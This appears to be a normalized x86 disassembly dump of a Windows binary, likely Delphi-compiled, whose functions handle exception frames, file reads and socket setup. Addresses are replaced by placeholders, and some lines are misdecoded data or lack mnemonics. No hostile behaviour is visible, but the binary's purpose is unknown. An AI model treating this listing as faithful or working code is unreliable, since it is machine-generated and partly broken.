mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d359
lea eax [ ebp - 0x10 ]
call sub_404e44
retn
sub_46d377
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_46d4bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
xor eax eax
push ebp
push sub_46d47b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
cmp ebx 0xffff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_40503c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_40644c
jmp r-xdata
push ebx
call sub_403e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4c2
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
call sub_403e2c
cmp ebx [ eax - 0x4 ]
jb r-xdata
cmp [ eax + ebx * 4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp ebx [ edx - 0x4 ]
jb r-xdata
mov edx [ edx + ebx * 4 ]
call sub_40503c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
add ebx 0x1
jno r-xdata
call sub_403e34
sub_46d480
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_462560
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4c2
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_46d4fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] ebx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46d54c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] ebx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46d59c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46d64e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebx + 0x4 ]
call sub_405324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_46bf40
jmp r-xdata
cmp esi 0xfa
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d655
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
call sub_403e2c
lea eax [ ebp - 0x8 ]
push eax
cmp esi 0xfa
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
xor ecx ecx
mov eax ebx
call sub_46bc54
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
add esi 0x1
jno r-xdata
call sub_403e2c
call sub_403e34
sub_46d65c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46d678
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_46d72e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46d711
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d718
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_46d74c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d831
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x1c
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
movzx eax [ ebp - 0x20 ]
sub ax 0x2
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x20 ]
lea edx [ eax + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_46bc54
mov edx [ ebp - 0x24 ]
mov eax edi
call sub_404e98
lea eax [ ebp - 0x20 ]
movzx eax [ eax + 0x2 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub ax 0x15
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d838
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_404e68
retn
lea eax [ ebp - 0x28 ]
push eax
lea edx [ ebp - 0x18 ]
mov cl 0x1
mov eax ebx
call sub_46bc54
mov edx [ ebp - 0x28 ]
mov eax edi
call sub_404e98
movzx eax [ ebp - 0x1e ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_46c49c
sub_46d844
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_46d878
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46d92f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46edbc
xor eax eax
push ebp
push sub_46d912
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x40
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp eax 0x3f
jbe r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 4 + 0xc ] ebx
mov eax [ ebp - 0x4 ]
add [ eax + 0x8 ] 0x1
jno r-xdata
call sub_403e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d919
mov eax [ ebp - 0x4 ]
call sub_46edd0
retn
call sub_403e34
sub_46d93c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46edbc
xor eax eax
push ebp
push sub_46d97a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
add eax 0x8
call sub_46b5a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d981
mov eax [ ebp - 0x4 ]
call sub_46edd0
retn
sub_46d984
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46edbc
xor eax eax
push ebp
push sub_46d9cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x8 ]
mov eax ebx
call sub_46b588
mov [ ebp - 0x5 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d9d3
mov eax [ ebp - 0x4 ]
call sub_46edd0
retn
sub_46d9dc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46edbc
xor eax eax
push ebp
push sub_46da1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da21
mov eax [ ebp - 0x4 ]
call sub_46edd0
retn
sub_46da28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46dad8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_46edbc
xor eax eax
push ebp
push sub_46dabb
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x8 ]
jge r-xdata
cmp ebx 0x3f
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + ebx * 4 + 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dac2
mov eax [ ebp - 0x4 ]
call sub_46edd0
retn
sub_46dae8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46edbc
xor ebx ebx
push ebp
push sub_46dba0
push [ fs : ebx ]
mov [ fs : ebx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
sub edx 0x1
jno r-xdata
test edx edx
jl r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dba7
mov eax [ ebp - 0x4 ]
call sub_46edd0
retn
inc edx
xor eax eax
mov ebx [ ebp - 0x4 ]
cmp esi [ ebx + ecx * 4 + 0xc ]
jne r-xdata
call sub_403e2c
inc eax
dec edx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub [ edx + 0x8 ] 0x1
jno r-xdata
mov ecx eax
cmp ecx 0x3f
jbe r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x8 ]
cmp edx 0x3f
jbe r-xdata
call sub_403e34
mov ebx [ ebp - 0x4 ]
mov edx [ ebx + edx * 4 + 0xc ]
cmp eax 0x3f
jbe r-xdata
call sub_403e2c
mov ebx [ ebp - 0x4 ]
mov [ ebx + ecx * 4 + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x8 ]
cmp edx 0x3f
jbe r-xdata
call sub_403e2c
mov ecx [ ebp - 0x4 ]
xor ebx ebx
mov [ ecx + edx * 4 + 0xc ] ebx
jmp r-xdata
call sub_403e2c
sub_46dbac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46dc4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_46c090
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dc56
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea ecx [ ebp - 0x18 ]
mov eax [ r-xdata ]
pop edx
call sub_4624e8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404e98
sub_46dc60
push ebx
push esi
add esp 0xfffffefc
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_46de98
push 0x0
push esi
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax [ ebx ]
call sub_46dc98
cmp [ esp ] 0x0
setg al
add esp 0x104
pop esi
pop ebx
retn
sub_46dc98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
push ecx
mov ecx 0x3e8
cdq
idiv ecx
pop ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ebx 0x3e8
cdq
idiv ebx
imul eax edx 0x3e8
jno r-xdata
push 0x0
push edi
push ecx
push esi
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push ecx
push esi
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
call sub_403e34
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_404114
mov edx ebx
call sub_46bf40
test eax eax
setg al
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46dd28
push ebx
push esi
push edi
add esp 0xfffffefc
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_46de98
push 0x0
push edi
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax [ ebx ]
call sub_46dc98
cmp [ esp ] 0x0
setg bl
test bl bl
je r-xdata
mov eax ebx
add esp 0x104
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
jne r-xdata
mov edx esp
mov eax [ esi ]
call sub_46de44
mov eax [ r-xdata ]
call sub_46ed7c
mov [ esi ] eax
sub_46dd84
push ebx
push esi
mov esi ecx
mov ebx edx
test eax eax
je r-xdata
xor eax eax
mov [ esi ] eax
pop esi
pop ebx
retn
mov edx ebx
call sub_46de98
mov [ esi ] ebx
pop esi
pop ebx
retn
sub_46dda4
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x118 ]
mov eax ebx
call sub_46dd84
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x21c ]
mov eax esi
call sub_46dd84
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x320 ]
mov eax edi
call sub_46dd84
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46dc98
mov [ ebp - 0x5 ] al
test ebx ebx
je r-xdata
test esi esi
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax ebx
call sub_46de44
test edi edi
je r-xdata
lea edx [ ebp - 0x21c ]
mov eax esi
call sub_46de44
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea edx [ ebp - 0x320 ]
mov eax edi
call sub_46de44
sub_46de44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46edbc
xor eax eax
push ebp
push sub_46de8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov esi ebx
lea edi [ eax + 0x8 ]
mov ecx 0x41
[ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46de92
mov eax [ ebp - 0x4 ]
call sub_46edd0
retn
sub_46de98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46edbc
xor eax eax
push ebp
push sub_46dedf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
lea esi [ eax + 0x8 ]
mov edi ebx
mov ecx 0x41
[ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dee6
mov eax [ ebp - 0x4 ]
call sub_46edd0
retn
sub_46deec
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
xor cl 0x1
movzx eax cl
mov [ esp ] eax
push esp
push 0x8004667e
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
pop edx
pop esi
pop ebx
retn
sub_46df1c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46ed38
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_46edbc
xor eax eax
push ebp
push sub_46df6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_46de44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df75
mov eax [ ebp - 0x4 ]
call sub_46edd0
retn
sub_46df7c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push 0x0
mov [ esp + 0x4 ] 0x2733
lea ecx [ esp + 0x4 ]
mov edx esi
mov eax ebx
call sub_46bf54
test eax eax
setne al
pop edx
pop esi
pop ebx
retn
sub_46dfa4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e106
push [ fs : eax ]
mov [ fs : eax ] esp
sub cl 0x1
jb r-xdata
mov eax esi
call sub_405324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
movzx edx [ eax ]
mov [ ebp - 0x4 ] dl
movzx edx [ eax + 0x1 ]
mov [ ebp - 0x3 ] dl
movzx edx [ eax + 0x2 ]
mov [ ebp - 0x2 ] dl
movzx eax [ eax + 0x3 ]
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
xor ecx ecx
mov eax ebx
call sub_46bc54
jmp r-xdata
mov eax ebx
call sub_46bf28
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e10d
lea eax [ ebp - 0x2c ]
call sub_404e44
retn
lea eax [ ebp - 0x28 ]
mov edx 0x20
call sub_407da8
mov [ ebp - 0x24 ] 0x17
mov [ ebp - 0x20 ] 0x1
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax esi
call sub_405324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
xor eax eax
push ebp
push sub_46e0e2
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov eax ebx
call sub_46c49c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x18 ]
lea edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_46bc54
mov eax esi
call sub_46b6e4
mov edx eax
mov eax ebx
call sub_46bff4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46e118
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov esi edx
mov ebx eax
movzx eax [ ebp + 0x8 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0xc ]
mov edx ecx
mov ecx ebx
xchg ecx eax
call sub_46bdb8
mov eax [ ebp + 0xc ]
cmp eax 0xffff
jbe r-xdata
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
jmp r-xdata
call sub_403e2c
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x2c ] 0x17
push 0x1
lea eax [ ebp - 0x24 ]
mov edx ecx
mov ecx ebx
xchg ecx eax
call sub_46bdb8
mov eax [ ebp + 0xc ]
cmp eax 0xffff
jbe r-xdata
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x2a ] ax
push 0x1c
lea eax [ ebp - 0x2c ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
jmp r-xdata
call sub_403e2c
mov eax ebx
call sub_46c49c
sub_46e1e8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e2cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x1c
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
movzx eax [ ebp - 0x20 ]
sub ax 0x2
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x20 ]
lea edx [ eax + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_46bc54
mov edx [ ebp - 0x24 ]
mov eax edi
call sub_404e98
lea eax [ ebp - 0x20 ]
movzx eax [ eax + 0x2 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub ax 0x15
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e2d4
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_404e68
retn
lea eax [ ebp - 0x28 ]
push eax
lea edx [ ebp - 0x18 ]
mov cl 0x1
mov eax ebx
call sub_46bc54
mov edx [ ebp - 0x28 ]
mov eax edi
call sub_404e98
movzx eax [ ebp - 0x1e ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_46c49c
sub_46e2e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov ecx 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xa4 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x98 ]
pop edi
pop esi
pop ebx
retn
sub_46e308
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_46e33c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x8 ] 0x4
mov eax [ ebp + 0xc ]
push eax
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xcc ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46e37c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x8 ]
call sub_402d28
mov [ ebp - 0xc ] eax
xor ebx ebx
push ebp
push sub_46e40d
push [ fs : ebx ]
mov [ fs : ebx ] esp
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e414
mov eax [ ebp - 0xc ]
call sub_402d44
retn
mov edx [ ebp - 0xc ]
sub eax 0x1
jno r-xdata
test eax eax
jl r-xdata
call sub_403e34
inc eax
add edx 0x174
dec eax
jne r-xdata
cmp [ edx + 0x4c ] 0x17
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
sub_46e438
push ebp
mov ebp esp
add esp 0xffffff5c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xa4 ] ebx
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e549
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
lea eax [ ebp - 0xa0 ]
xor ecx ecx
